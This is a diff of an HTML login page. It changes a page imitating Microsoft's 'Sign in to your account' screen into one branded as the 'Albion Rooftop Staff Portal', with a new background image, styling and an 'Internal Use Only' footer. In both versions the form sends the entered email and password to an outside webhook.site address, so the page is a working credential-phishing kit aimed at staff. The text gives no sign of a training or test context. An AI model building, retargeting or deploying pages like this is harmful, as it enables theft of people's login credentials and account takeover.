@@ -2,32 +2,95 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Sign in to your account</title>
-  <link rel="icon" href="https://secure.aadcdn.microsoftonline-p.com/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Albion Rooftop Staff Portal</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Raleway:wght@300;400;700&display=swap" />
   <style>
-    body { background-color: #f3f2f1; font-family: 'Segoe UI', sans-serif; }
-    .container { width: 400px; margin: 100px auto; background: white; padding: 30px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
-    input[type="email"], input[type="password"] {
-      width: 100%; padding: 10px; margin-top: 10px; margin-bottom: 20px;
-      border: 1px solid #ccc; border-radius: 4px;
+    body {
+      margin: 0;
+      font-family: 'Raleway', sans-serif;
+      background: url('https://images.squarespace-cdn.com/content/v1/58a0f62eb3db2bbd08b0aa3d/1615263844126-2E2UB9RTT6HV5CLN1IUS/DSC06115.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
     }
+
+    .overlay {
+      background-color: rgba(0, 0, 0, 0.6);
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+    }
+
+    .container {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 400px;
+      margin: 100px auto;
+      background: rgba(255,255,255,0.95);
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.4);
+      color: #333;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      font-weight: 700;
+    }
+
+    label {
+      font-weight: 500;
+    }
+
+    input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-top: 8px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+
     button {
-      width: 100%; padding: 10px;
-      background: #0078d4; border: none; color: white; font-size: 16px;
+      width: 100%;
+      background-color: #000;
+      color: white;
+      border: none;
+      padding: 14px;
+      font-size: 16px;
+      border-radius: 4px;
       cursor: pointer;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      margin-top: 20px;
+      color: #aaa;
     }
   </style>
 </head>
 <body>
+  <div class="overlay"></div>
   <div class="container">
-    <h2>Sign in</h2>
+    <h2>Albion Staff Portal</h2>
     <form method="POST" action="https://webhook.site/08a7406b-db34-4533-9dfa-bd111c749f10">
-      <label>Email</label>
-      <input type="email" name="email" required>
+      <label>Email Address</label>
+      <input type="email" name="email" required />
+
       <label>Password</label>
-      <input type="password" name="password" required>
-      <button type="submit">Sign in</button>
+      <input type="password" name="password" required />
+
+      <button type="submit">Log In</button>
     </form>
+    <div class="footer">
+      © Albion Rooftop 2025 – Internal Use Only
+    </div>
   </div>
 </body>
 </html>
